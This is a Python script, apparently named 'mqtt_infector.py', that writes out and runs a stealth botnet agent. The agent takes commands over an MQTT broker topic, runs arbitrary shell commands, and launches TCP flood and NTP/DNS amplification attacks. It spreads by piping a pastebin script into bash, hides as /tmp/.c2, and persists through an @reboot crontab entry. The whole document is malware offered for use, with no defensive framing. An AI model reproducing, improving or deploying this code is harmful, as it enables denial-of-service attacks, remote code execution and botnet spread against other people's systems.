#!/usr/bin/env python3
import sys
import subprocess

if len(sys.argv) < 2:
    print("❌ USAGE: python3 mqtt_infector.py BROKER_IP")
    sys.exit(1)

BROKER_IP = sys.argv[1]
print(f"🎯 TARGET: {BROKER_IP}")

# AGENT REAL - METODI NATIVI NO HPING
agent = f'''#!/bin/bash
# STEALTH MQTT C2 AGENT
cat > /tmp/.c2 <<'C2_EOF'
#!/bin/bash
TRAP_KILL() {{ pkill -f tcp_syn_flood; pkill -f udp_amp; pkill -f c2; }}
trap TRAP_KILL EXIT TERM INT

# TCP SYN FLOOD NATIVO
tcp_syn_flood() {{
  IP=$1 PORT=$2
  while true; do
    timeout 1 bash -c "echo -e '\\\\x00\\\\x02\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00' | nc -u -w1 $IP $PORT 2>/dev/null" &
    sleep 0.001
  done
}}

# UDP AMPLIFICATION (NTP/DNS)
udp_amp() {{
  IP=$1 PORT=$2
  while true; do
    # NTP MONLIST AMP (porta 123)
    echo -e "\\\\x17\\\\x00\\\\x03\\\\x2a\\\\x00\\\\x00\\\\x00\\\\x01" | nc -u -w1 $IP 123 2>/dev/null &
    # DNS AMP (porta 53)
    echo -e "\\\\xaa\\\\xaa\\\\x01\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x03www\\\\x06google\\\\x03com\\\\x00\\\\x00\\\\x01\\\\x00\\\\x01" | nc -u -w1 $IP 53 2>/dev/null &
    sleep 0.002
  done
}}

while true; do
  mosquitto_sub -h {BROKER_IP} -t c2/broadcast 2>/dev/null | while IFS=: read -r CMD ARG1 ARG2; do
    case $CMD in
      tcpsyn) tcp_syn_flood "$ARG1" "$ARG2" & ;;
      udpamp) udp_amp "$ARG1" "$ARG2" & ;;
      shell) bash -c "$ARG1" & ;;
      kill|stop) pkill -f tcp_syn_flood; pkill -f udp_amp ;;
      prop) # AUTO-PROPAGAZIONE
        curl -s https://pastebin.com/raw/ABC123 | bash || mosquitto_pub -h {BROKER_IP} -t c2/broadcast -m "shell:curl -s pastebin.com/raw/ABC123|bash" ;;
    esac
  done || sleep 5
done
C2_EOF

chmod +x /tmp/.c2
nohup /tmp/.c2 > /dev/null 2>&1 &

# PERSISTENZA
(crontab -l 2>/dev/null | grep -v ".c2"; echo "@reboot /tmp/.c2") | crontab -

# AUTO-PROPAGAZIONE AI CLIENTI
mosquitto_pub -h {BROKER_IP} -t c2/broadcast -m "prop" &

echo "✅ INFECTED + PROPAGATED!"
'''

subprocess.run(f"echo '{agent}' | bash", shell=True, check=True)
print("🎯 DEPLOY SUCCESS")
